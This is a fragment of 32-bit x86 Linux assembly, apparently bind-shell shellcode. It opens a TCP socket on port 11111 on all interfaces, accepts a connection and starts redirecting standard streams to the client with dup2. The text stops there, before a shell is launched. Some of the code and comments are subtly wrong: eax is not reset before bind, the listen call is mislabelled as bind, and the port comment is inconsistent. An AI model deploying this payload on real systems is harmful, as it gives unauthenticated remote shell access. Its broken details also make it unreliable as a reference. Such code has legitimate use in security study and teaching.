global _start

section .text

_start:

	; syscalls (/usr/include/asm/unistd_32.h)
	; socketcall numbers (/usr/include/linux/net.h)

	; Set up for socket file descriptor
	; int socket(int domain, int type, int protocol) (man 2 socket)
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP) (parameters)

	mov eax, 102	; Syscall 102 - socketcall 
	mov ebx, 1 	; Socketcall type - sys_socket 1

	; Setting parameters for the socket

	push 0	; IPPROTO_IP 0=all (protocol)
	push 1	; SOCK_STREAM 1 (type)
	push 2	; AF_INET 2 (domain)

	mov ecx, esp	; Pointer to arguments array

	int 0x80	; Interrupt for socket

	mov edx, eax	; Saving file descriptor

	; Binding socket
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; bind(sockfd, [AF_INET, 11111, INADDR_ANY], 16)

	mov ebx, 2	; Socketcall type - sysbind 2
	
	; Making sockaddr in a struct (sys/socket.h, netinet/in.h and bits/sockaddr.h)

	push 0			; INNADR_ANY=0 (uint32_t)
	push WORD 0x672b	; port in byte reverse order (1111) (uint16_t)
	push WORD 2		; AF_INTER=2 (unsigned short int)
	mov ecx, esp		; struct pointer

	; Bind Arguments (sys/socket.h) 
	push 16			; sockaddr struct size = sizeof(struct sockaddr) = 16 (socklen_t)
	push ecx		; sockaddr_in struct pointer (struct sockaddr *)
	push edx		; socket fd (int)

	mov ecx, esp		; ptr to arg array

	int 0x80		; Kernel Interrupt


	; Preparing to listen the incoming connection (passive socket)
	; int listen(int sockfd, int backlog);
	; accept(sockfd, 0)

	mov eax, 102		; Syscall 102 - socketcall
	mov ebx, 4		; socketcall type 4 (sys_bind)

	; listen arguments
	
	push 0			; Backlog (Connections Que Size)
	push edx		; Socket FD

	mov ecx, esp		; ptr to arg array

	int 0x80		; Kernel Interrupt


	; Accepting the Incoming Connection
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; accept(sockfd, NULL, NULL)

	mov eax, 102		; Syscall 102 - socketcall
	mov ebx, 5		; socketcall type 5 (sys_accept)

	; Accept Args

	push 0			; Null - Know Nothing About Client
	push 0                  ; Null - Know Nothing About Client
	push edx		; Socket FD

	mov ecx, esp		; Ptr to Arg Array

	int 0x80		; Kernel Interrupt

	mov edx, eax		; Saving the Returned Socket FD (client)

	; Creating a Copy of the 3 File Descriptors (stdin, stdout, stderr)
	; int dup2(int oldfd, int newfd)
	; dup2(clientfd, ..)

	mov eax, 63		; Syscall 63 - dup2
